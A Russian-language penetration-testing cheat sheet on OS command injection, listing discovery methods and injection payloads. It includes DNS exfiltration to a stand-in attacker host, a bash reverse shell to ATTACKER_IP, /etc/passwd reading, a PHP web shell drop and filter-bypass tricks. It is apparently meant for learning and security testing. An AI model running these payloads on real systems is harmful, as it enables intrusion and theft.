## 1. Внедрение команд ОС

### 1.1 Определение предположительных мест уязвимости

Уязвимости внедрения команд ОС могут встречаться в различных компонентах системы, таких как:

- **Веб-приложения**: Параметры HTTP-запросов (GET, POST, заголовки), поля ввода данных (формы, поисковые запросы).

- **Системные утилиты**: Приложения, которые взаимодействуют с командной строкой (например, системные скрипты, утилиты администрирования).

- **Сетевые сервисы**: Сервисы, которые принимают входные данные и передают их в командную строку (например, SSH, FTP, SMTP).

- **API**: Интерфейсы, которые принимают данные от пользователя и передают их в системные команды.

### 1.2 Методы поиска уязвимостей

- **Анализ входных данных**: Проверка всех параметров, которые передаются в приложение (GET, POST, заголовки, куки).

- **Фаззинг**: Автоматизированная отправка случайных или специально сформированных данных для выявления аномалий в поведении системы.

- **Статический анализ кода**: Поиск вызовов функций, которые выполняют команды ОС (например, `exec()`, `system()`, `popen()` в PHP, `os.system()` в Python).

----

## 2. Полезные команды для эксплуатации

| Цель команды              | Линукс        | Винда           |
| ------------------------- | ------------- | --------------- |
| Имя текущего пользователя | `whoami`      | `whoami`        |
| Операционная система      | `uname -a`    | `ver`           |
| Конфигурация сети         | `ifconfig`    | `ipconfig /all` |
| Сетевые соединения        | `netstat -an` | `netstat -an`   |
| Запуск процессов          | `ps -ef`      | `tasklist`      |

---

## 3. Уязвимости слепого внедрения команд ОС


### 3.1 Обнаружение слепого внедрения команд ОС

Слепое внедрение команд ОС (Blind OS Command Injection) происходит, когда результат выполнения команды не возвращается напрямую пользователю. Для обнаружения таких уязвимостей можно использовать следующие методы:

#### 3.1.1 Использование временных задержек

- **Метод**: Внедрение команды, которая вызывает задержку выполнения (например, `ping`).

- **Пример**:
    `& ping -c 10 127.0.0.1 &`
    
	Если система задерживает ответ на 10 секунд, это может указывать на уязвимость.


#### 3.1.2 Перенаправление вывода

- **Метод**: Перенаправление вывода команды в файл, который можно будет прочитать позже.

- **Пример**:
    `& whoami > /var/www/static/whoami.txt &`
    
    Необходимо понимание структуры директорий и доступ к файлу через веб-сервер.


#### 3.1.3 Использование внеполосных (OAST) методов

- **Метод**: Использование DNS или HTTP-запросов для передачи данных на внешний сервер.

- **Пример**:
    `& nslookup 'whoami'.kgji2ohoyw.web-attacker.com &`
    
    Данные о текущем пользователе будут переданы через DNS-запрос.

---

## 4. Методы эксплуатации

### 4.1 Получение обратного shell

- **Метод**: Использование уязвимости для запуска команды, которая устанавливает соединение с атакующим.

- **Пример**:
    `& bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' &`

### 4.2 Чтение файлов

- **Метод**: Использование команд для чтения файлов на сервере.

- **Пример**:
    `& cat /etc/passwd &`

### 4.3 Запись файлов

- **Метод**: Использование команд для записи файлов на сервере (например, создание веб-шелла).

- **Пример**:
    `& echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/shell.php &`


---

## 5. Методы обхода защит

### 5.1 Обход фильтрации входных данных

- **Метод**: Использование кодировок или специальных символов для обхода фильтров.

- **Пример**:
    `& who%61mi &`
    
    (URL-кодирование символов)

### 5.2 Обход ограничений на выполнение команд

- **Метод**: Использование альтернативных команд или цепочек команд.

- **Пример**:
    `& echo 'whoami' | bash &`


### 5.3 Использование переменных окружения

- **Метод**: Использование переменных окружения для выполнения команд.
    
- **Пример**:
    `& ${PATH:0:1}tmp${PATH:0:1}whoami &`
